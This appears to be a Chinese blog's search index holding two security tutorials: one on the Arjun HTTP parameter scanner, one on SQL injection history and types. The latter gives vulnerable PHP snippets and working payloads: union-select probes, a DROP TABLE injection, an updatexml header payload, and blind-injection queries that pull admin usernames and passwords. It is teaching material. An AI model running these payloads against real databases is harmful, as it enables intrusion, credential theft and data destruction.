<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Arjun初探</title>
    <link href="/2023/03/21/arjun%E5%88%9D%E6%8E%A2/"/>
    <url>/2023/03/21/arjun%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="Arjun为何"><a href="#Arjun为何" class="headerlink" title="Arjun为何"></a>Arjun为何</h1><p>Arjun是一款基于python开发的http参数扫描器，采用二分法的思想。爆破url参数，自带25980个参数，Arjun会将参数分为25个块，根据response的长度判断是否有有效参数。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>arjun无法在Python&lt;3.4的环境下下运行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install arjun<br></code></pre></td></tr></table></figure><p>注：kali自带python2与python3环境但缺少pip，所以需先安装pip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install python3-pip<br></code></pre></td></tr></table></figure><p><img src="/img/arjun1.jpg" alt="安装arjun"></p><h2 id="参数详情"><a href="#参数详情" class="headerlink" title="参数详情"></a>参数详情</h2><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs prolog">usage: arjun [-h] [-u <span class="hljs-symbol">URL</span>] [-o <span class="hljs-symbol">JSON_FILE</span>] [-oT <span class="hljs-symbol">TEXT_FILE</span>] [-oB [<span class="hljs-symbol">BURP_PORT</span>]] [-d <span class="hljs-symbol">DELAY</span>]<br>             [-t <span class="hljs-symbol">THREADS</span>] [-w <span class="hljs-symbol">WORDLIST</span>] [-m <span class="hljs-symbol">METHOD</span>] [-i [<span class="hljs-symbol">IMPORT_FILE</span>]] [-<span class="hljs-symbol">T</span> <span class="hljs-symbol">TIMEOUT</span>] [-c <span class="hljs-symbol">CHUNKS</span>]<br>             [-q] [--headers [<span class="hljs-symbol">HEADERS</span>]] [--passive [<span class="hljs-symbol">PASSIVE</span>]] [--stable] [--include <span class="hljs-symbol">INCLUDE</span>]<br>             [--disable-redirects]<br><br>optional arguments:<br>  -h, --help            查看帮助信息并退出<br>  -u <span class="hljs-symbol">URL</span>                指定目标 <span class="hljs-symbol">URL</span><br>  -o <span class="hljs-symbol">JSON_FILE</span>, -oJ <span class="hljs-symbol">JSON_FILE</span><br>                        指定json输出文件路径.<br>  -oT <span class="hljs-symbol">TEXT_FILE</span>         指定text输出文件路径.<br>  -oB [<span class="hljs-symbol">BURP_PORT</span>]       输出到 <span class="hljs-symbol">Burp</span> <span class="hljs-symbol">Suite</span> 代理的端口。 默认端口为 <span class="hljs-number">8080.</span><br>  -d <span class="hljs-symbol">DELAY</span>              指定请求延迟（以秒为单位）. (default: <span class="hljs-number">0</span>)<br>  -t <span class="hljs-symbol">THREADS</span>            指定线程数. (default: <span class="hljs-number">5</span>)<br>  -w <span class="hljs-symbol">WORDLIST</span>           指定字典路径. (default: &#123;arjundir&#125;/db/large.txt)<br>  -m <span class="hljs-symbol">METHOD</span>             指定请求模式: <span class="hljs-symbol">GET</span>/<span class="hljs-symbol">POST</span>/<span class="hljs-symbol">XML</span>/<span class="hljs-symbol">JSON</span>/<span class="hljs-symbol">HEADERS</span>. (default: <span class="hljs-symbol">GET</span>)<br>  -i [<span class="hljs-symbol">IMPORT_FILE</span>]      从指定文件获取<span class="hljs-symbol">URLs</span>.<br>  -<span class="hljs-symbol">T</span> <span class="hljs-symbol">TIMEOUT</span>            <span class="hljs-symbol">HTTP</span> 请求超时秒数. (default: <span class="hljs-number">15</span>)<br>  -c <span class="hljs-symbol">CHUNKS</span>             请求块大小，一次发送的参数数量. (default: <span class="hljs-number">25</span>)<br>  -q                    <span class="hljs-symbol">Quiet</span> mode. 无输出.<br>  --headers [<span class="hljs-symbol">HEADERS</span>]   指定请求头，以行分隔.<br>  --passive [<span class="hljs-symbol">PASSIVE</span>]   被动收集参数模式.<br>  --stable              稳定优先模式.<br>  --include <span class="hljs-symbol">INCLUDE</span>     自定义请求包含数据.<br>  --disable-redirects   禁止重定向<br><br></code></pre></td></tr></table></figure><h2 id="原理详情"><a href="#原理详情" class="headerlink" title="原理详情"></a>原理详情</h2><h3 id="使用proxychains4-把arjun流量代理到burp-suite"><a href="#使用proxychains4-把arjun流量代理到burp-suite" class="headerlink" title="使用proxychains4 把arjun流量代理到burp suite:"></a>使用proxychains4 把arjun流量代理到burp suite:</h3><p>编辑proxychains4配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/proxychains4.conf<br></code></pre></td></tr></table></figure><p>在Proxylist填写burp suite代理端口，我这里是8080：<br><img src="/img/arjun2.jpg" alt="proxychains4代理设置"><br>代理arjun：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 arjun -u http://127.1:80/<span class="hljs-built_in">test</span> -oT result.txt<br></code></pre></td></tr></table></figure><p>查看arjun数据包：</p><p><img src="/img/arjun3.jpg" alt="arjun 1"><br><img src="/img/arjun4.jpg" alt="arjun 2"><br><img src="/img/arjun5.jpg" alt="arjun 3"><br>Arjun会将参数分为25个块，一个块400个参数，根据response的长度判断是否有有效参数，若有有效参数，进一步二分，判断有效参数，只需要向目标发送30-5个请求即可完成任务。</p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Arjun</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL Injection的前世今生浅谈</title>
    <link href="/2023/03/20/SQL%20Injection%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%E6%B5%85%E8%B0%88/"/>
    <url>/2023/03/20/SQL%20Injection%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F%E6%B5%85%E8%B0%88/</url>
    
    <content type="html"><![CDATA[<h1 id="前世"><a href="#前世" class="headerlink" title="前世"></a>前世</h1><h2 id="1998"><a href="#1998" class="headerlink" title="1998"></a>1998</h2><p>时光回溯到1998年，这一年是中国证券市场的开端，这一年乌蝇哥在《旺角卡门》里贡献出了在16年火遍大江南北的表情包<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[激荡四十年-1988](https://www.bilibili.com/video/BV1bX4y1V7KF/?spm_id_from=333.999.0.0&vd_source=249ffa3703b6e86763a24381e58a14a4)">[1]</span></a></sup> ，也是这一年Rain Forest Puppy（RFP）在杂志phrack 54上发表题目为《NT web Technology vulnerabilities》<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="http://phrack.org/issues/54/8.html#article">[2]</span></a></sup>的文章，在 —[ ODBC and MS SQL server 6.5 这一节首次提到了SQL注入<br></p><h2 id="1999"><a href="#1999" class="headerlink" title="1999"></a>1999</h2><p>1999年2月，Allaire发出警告 “Multiple SQL Statements in Dynamic Queries”<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://www.51cto.com/article/231122.html">[3]</span></a></sup><br><br>1999年5月， RFP与Matthew Astley发出警告 “NT ODBC Remote Compromise”<br></p><h2 id="2000"><a href="#2000" class="headerlink" title="2000"></a>2000</h2><p>2000年2月，RFP发表文章 “How I hacked Packetstorm – A look at hacking  wwthreads via SQL”，披露如何利用SQL注入攻击渗透Packetstorm网站<br><br>2000年9月，David Litchfield在Blackhat会议上发表主题演讲“Application Assessments on IIS”<br><br>2000年10月，Chip Andrews在SQLSecurity.com 上发表“SQL Injection FAQ ”，首次公开使用“SQL注入”这个术语<br></p><h2 id="2001"><a href="#2001" class="headerlink" title="2001"></a>2001</h2><p>2001年4月，David Litchfield 在Blackhat会议上发表主题演讲 “Remote Web Application Disassembly with ODBC Error Messages”<br></p><h2 id="2002"><a href="#2002" class="headerlink" title="2002"></a>2002</h2><p>2002年1月，Chris Anley发表论文“Advanced SQL Injection in SQL Server”，首次深度探讨该类攻击。<br><br>2002年6月，Chris Anley发表论文 “(more) Advanced SQL” ，补充同年1月发表的论文缺少的细节。<br>  </p><h2 id="2004"><a href="#2004" class="headerlink" title="2004"></a>2004</h2><p>2004年Blackhat会议上， 0x90.org发布了SQL注入工具SQeaL ( Absinthe的前身)<br></p><h2 id="2006"><a href="#2006" class="headerlink" title="2006"></a>2006</h2><p>2006年7月25日，Daniele Bellucci在 SourceForge 上注册了sqlmap项目并添加了对MySQL的有限的支持<br><br>同年8月Daniele 添加了对 PostgreSQL 的初步支持并发布了0.1版<br><br>至此进入SQL Injection进入自动化时代，我们可以从sqlmap的更新与历史<sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://github.com/sqlmapproject/sqlmap/wiki/History">[4]</span></a></sup>里窥见SQL Injection发展史的一角<br></p><h1 id="今生"><a href="#今生" class="headerlink" title="今生"></a>今生</h1><h2 id="SQL-Injection为何"><a href="#SQL-Injection为何" class="headerlink" title="SQL Injection为何"></a>SQL Injection为何</h2><p>SQL注入是因为后台执行SQL语句时拼接了用户的输入，仅此而已</p><h2 id="SQL-Injection的分类"><a href="#SQL-Injection的分类" class="headerlink" title="SQL Injection的分类"></a>SQL Injection的分类</h2><h3 id="按注入点分类"><a href="#按注入点分类" class="headerlink" title="按注入点分类"></a>按注入点分类</h3><h4 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h4><p>数字型也就是我们注入点的参数为int类型，在url上大概长下面这个样子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://ex.com/query.php?id=1<br></code></pre></td></tr></table></figure><p>后端接受数据以php为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;select name,age,gender from t_students where id = <span class="hljs-subst">&#123;$_GET[&quot;id&quot;]&#125;</span>&quot;</span>;<br></code></pre></td></tr></table></figure><p>注入payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>那么后端接受到的数据就会变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;select name,age,gender from t_students where id = 1 union select 1,database(),3 -- &quot;</span>;<br></code></pre></td></tr></table></figure><h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p>数字型也就是我们注入点的参数为str类型，在url上大概长下面这个样子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://ex.com/query.php?uname=admin<br></code></pre></td></tr></table></figure><p>后端接受数据以php为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;select name,age,gender from t_students where uname = &#x27;<span class="hljs-subst">&#123;$_GET[&#x27;uname&#x27;]&#125;</span>&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p>注入payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27; union select 1,database(),3 --</span><br></code></pre></td></tr></table></figure><p>那么后端接受到的数据会变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;select name,age,gender from t_students where uname = &#x27;admin&#x27; union select 1,database(),3 --&quot;</span><br></code></pre></td></tr></table></figure><h4 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a>搜索型</h4><p>搜索型也就是我们注入点在搜索框，它后端接受数据大概长这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pwd</span> = &amp;_GET[<span class="hljs-string">&#x27;something&#x27;</span>]<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;select * from commodity where name like &#x27;%<span class="hljs-subst">$something</span>%&#x27; order by price&quot;</span>;<br></code></pre></td></tr></table></figure><p>注入payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and drop table commodity and &#x27;</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27;=&#x27;</span><br></code></pre></td></tr></table></figure><p>那么后端接受到的数据就会变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;select * from commodity where name like &#x27;%&#x27; and drop table commodity and &#x27;%&#x27;=&#x27;%&#x27; order by price&quot;</span>;<br></code></pre></td></tr></table></figure><p>就会删除服务器里的commodity表，现在我们大概了解了sql注入的原理，就是用户的输入被拼接到数据库中执行了。那么我们接着看一下其他的分类</p><h3 id="按提交方式分类"><a href="#按提交方式分类" class="headerlink" title="按提交方式分类"></a>按提交方式分类</h3><h4 id="get注入"><a href="#get注入" class="headerlink" title="get注入"></a>get注入</h4><p>数据是以get方式提交的，注入点一般在get提交的url后面，可以使用的hackbar以及burp suite进行更方便的注入</p><h4 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h4><p>数据是以post方式提交的，注入点一般在表单填写处，如资料填写等地方，需使用burp suite之类的抓包工具修改与注入</p><h4 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h4><p>cookie注入是因为一些获取参数的函数会从cookie中寻找数据而引发的。在对方对get和post注入都进行了防御的时候，有可能忽视cookie，所以在get，post直接注入不行的时候可以尝试cookie注入，但其注入的原理与正常注入的原理是一样的。<br><br>在ASP中如果服务器读取值用的是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asp">ID = Request(&quot;ID&quot;)<br></code></pre></td></tr></table></figure><p>当WEB服务器没有在get与post中取到数据的时候会去cookie中寻找数据，如果对于从cookie取得的值没有经过处理的话，就会引起cookie注入。<br>如果使用的是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asp">ID = Request.QueryString(&quot;ID&quot;) // 获取以GET方式提交的数据<br>ID = Request.Form(&quot;ID&quot;)   // 获取以POST方式提交的数据<br></code></pre></td></tr></table></figure><p>就不会有cookie注入</p><h4 id="http头注入-5"><a href="#http头注入-5" class="headerlink" title="http头注入[5]"></a>http头注入<sup id="fnref:5" class="footnote-ref"><a href="#fn:5" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://blog.csdn.net/weixin_44426869/article/details/104326877">[5]</span></a></sup></h4><p>先说SQL注入应该不局限于select。insert，update，delete函数也是可以注入的。<br><br>再说常见的http头注入的参数</p><pre><code class="hljs">- User-Agent // 是的服务器能识别客户操作系统，浏览器版本等- cookie   // 身份鉴别- X-Forwarded-For   // XFF头，它代表客户端，也就是HTTP的请求端真实的ip- Client-Ip    //同上- Rerferer   // 请求来源的上级页面- Host    // 指定访问的web服务器域名或ip和端口号- ....</code></pre><p>当服务器要获取客户端信息，比如获取User-Agent的值并insert into 数据库时，就会发生http头注入<br>常见相关函数：</p><pre><code class="hljs">- UpdateXML(xml_target,xpath_expr,new_xml)    - 此函数将xml_target中用xpath_expr路径匹配xml片段用new_xml替换，返回更改的xml。    - xml_target被替换的部分与xpath_expr用户提供的xpath表达式匹配    - 如果找不到表达式匹配xpath_expr项，或找到多个匹配项，则该函数返回原始xml_targetXML片段    - 三个参数都为字符串- ExtractVakue(xml_frag,xpath_expr)    - 此函数返回在xml_frag用xpath_expr路径匹配到的xml片段- floor(x)    - 此函数返回不大于x的最大整数</code></pre><p>在UpdateXML()、ExtractValue()函数中，当参数xpath_expr路径语法错误时，就会报错，将xpath_expr中内容当作sql语句执行后结果和报错结果一同返回</p><p>floor()报错，需要count()、rand()、group by，三者缺一不可。<br>floor(rand(0)*2)每次执行结果是基本固定的——011011…<br>在使用group by floor(rand(0)*2)创建虚拟表的过程中，向虚拟表中插入数据时，主键的计算产生相同的结果，插入报错。</p><p>以update_xml为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$uagent</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>]<br>inset into uaget (<span class="hljs-string">&#x27;uagent&#x27;</span>.<span class="hljs-string">&#x27;username&#x27;</span>) values (<span class="hljs-string">&#x27;$uagent&#x27;</span>,<span class="hljs-string">&#x27;uname&#x27;</span>);<br></code></pre></td></tr></table></figure><p>当http请求头payload为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">User</span>-Agent:&#x27; or updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,database(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)# Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>)<br></code></pre></td></tr></table></figure><p>后端接受到的数据为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">inset into uaget (<span class="hljs-string">&#x27;uagent&#x27;</span>.<span class="hljs-string">&#x27;username&#x27;</span>) values (<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,database(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)<span class="hljs-comment"># Mozilla/5.0 (Windows NT 10.0; Win64; x64)&#x27;,&#x27;uname&#x27;);</span><br></code></pre></td></tr></table></figure><p>此时’#’后面的内容被注释掉了，通过制造报错信息，会把查询到的信息显示出来</p><h3 id="按执行效果分类"><a href="#按执行效果分类" class="headerlink" title="按执行效果分类"></a>按执行效果分类</h3><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面，需要使用一些特殊的方式来判断是否注入成功的过程就叫盲注<sup id="fnref:6" class="footnote-ref"><a href="#fn:6" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://blog.csdn.net/qq_42477007/article/details/96492174">[6]</span></a></sup></p><ul><li>布尔盲注</li></ul><p>当我们在执行sql语句后，页面只有两种结果，例如返回内容(ture)与不返回内容(flase),这时就可以用过构造逻辑表达式来判断具体内容<br>布尔盲注会用到的函数:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(str,start,length)</span></span> <span class="hljs-comment">//字符串截取</span><br><span class="hljs-function"><span class="hljs-title">ORD</span><span class="hljs-params">()</span></span>                 <span class="hljs-comment">//ascii码转换</span><br><span class="hljs-function"><span class="hljs-title">length</span><span class="hljs-params">()</span></span>              <span class="hljs-comment">//统计长度</span><br><span class="hljs-function"><span class="hljs-title">version</span><span class="hljs-params">()</span></span>             <span class="hljs-comment">//查看数据库版本</span><br><span class="hljs-function"><span class="hljs-title">database</span><span class="hljs-params">()</span></span>            <span class="hljs-comment">//查看当前数据库名</span><br><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span>                <span class="hljs-comment">//查看当前用户</span><br></code></pre></td></tr></table></figure><p>猜解数据库长度:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or length(database()) &gt; 8 --+</span><br></code></pre></td></tr></table></figure><p>猜解数据库名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or mid(database(),1,1)= &#x27;</span>z<span class="hljs-string">&#x27; --+   // 因为需要验证的字符太多，所以转化为ascii码验证</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> ORD(mid(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span> <span class="hljs-comment">--+ // 通过确定ascii码，从而确定数据库名</span><br></code></pre></td></tr></table></figure><p>猜解表总数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 2  --+   //判断表的总数</span><br></code></pre></td></tr></table></figure><p>猜解第一个表名的长度：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) = 5 --+</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> (<span class="hljs-keyword">select</span> length(TABLE_NAME) <span class="hljs-keyword">from</span> information_schema.TABLES <span class="hljs-keyword">where</span> TABLE_SCHEMA<span class="hljs-operator">=</span>database() limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-number">5</span> <span class="hljs-comment">--+ （第二个表）</span><br></code></pre></td></tr></table></figure><p>猜解第一个表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1 ),1,1) = &#x27;</span>a<span class="hljs-string">&#x27;  --+</span><br><span class="hljs-string">或者</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">Or</span> ORD(mid(<span class="hljs-keyword">select</span> TABLE_NAME <span class="hljs-keyword">from</span> information_schema.TABLES <span class="hljs-keyword">where</span> TABLE_SCHEMA <span class="hljs-operator">=</span> database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-operator">&gt;</span><span class="hljs-number">100</span>   <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>猜解表的字段的总数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or (select count(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;</span>表名<span class="hljs-string">&#x27;) &gt; 5 --+</span><br></code></pre></td></tr></table></figure><p>猜解第一个字段的长度：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;</span>表名<span class="hljs-string">&#x27; limit 0,1) = 10 --+</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> (<span class="hljs-keyword">select</span> length(column_name) <span class="hljs-keyword">from</span> information_schema.COLUMNS <span class="hljs-keyword">where</span> TABLE_NAME<span class="hljs-operator">=</span><span class="hljs-string">&#x27;表名&#x27;</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-number">10</span> <span class="hljs-comment">--+ （第二个字段）</span><br></code></pre></td></tr></table></figure><p>猜解第一个字段名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = &#x27;</span>表名<span class="hljs-string">&#x27; limit 0,1),1,1) = &#x27;</span>i<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string">或者</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> ORD(mid((<span class="hljs-keyword">select</span> COLUMN_NAME <span class="hljs-keyword">from</span> information_schema.COLUMNS <span class="hljs-keyword">where</span> TABLE_NAME <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;表名&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>直接猜解字段名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;</span>表名<span class="hljs-string">&#x27; limit 1,1) = &#x27;</span>username<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><p>猜解内容长度：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">假如已经知道字段名为  id   username password<br><span class="hljs-string">&#x27;or (select Length(concat(username,&quot;---&quot;,password)) from admin limit 0,1) = 16  --+</span><br></code></pre></td></tr></table></figure><p>猜解内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or mid((select concat(username,&quot;-----&quot;,password) from admin limit 0,1),1,1) = &#x27;</span>a<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string">或者</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> ORD(mid((<span class="hljs-keyword">select</span> concat(username,&quot;-----&quot;,password) <span class="hljs-keyword">from</span> admin limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span> <span class="hljs-comment">--+    // ASCII码猜解</span><br></code></pre></td></tr></table></figure><p>直接猜解内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;or (Select concat(username,&quot;-----&quot;,password) from admin limit 0,1 ) = &#x27;</span>admin<span class="hljs-comment">-----123456&#x27;   --+</span><br></code></pre></td></tr></table></figure><ul><li>时间盲注</li></ul><p>提交对执行时间敏感的函数sql语句，通过执行时间的长短来判断是否执行成功，比如:正确的话会导致时间很长，错误的话会导致执行时间很短，这就是所谓的时间盲注<br><br>时间盲注会用到的函数:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Sleep</span><span class="hljs-params">()</span></span>                           :延迟函数<br><span class="hljs-function"><span class="hljs-title">If</span><span class="hljs-params">(condition,true,false)</span></span>          :条件语句<br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(str,start,length)</span></span>             :字符串截取<br><span class="hljs-function"><span class="hljs-title">ORD</span><span class="hljs-params">()</span></span>                             :转换成ascii码<br><span class="hljs-function"><span class="hljs-title">Length</span><span class="hljs-params">()</span></span>                          :统计长度<br><span class="hljs-function"><span class="hljs-title">version</span><span class="hljs-params">()</span></span>                         :查看数据库版本<br><span class="hljs-function"><span class="hljs-title">database</span><span class="hljs-params">()</span></span>                        :查看当前数据库名<br><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span>                            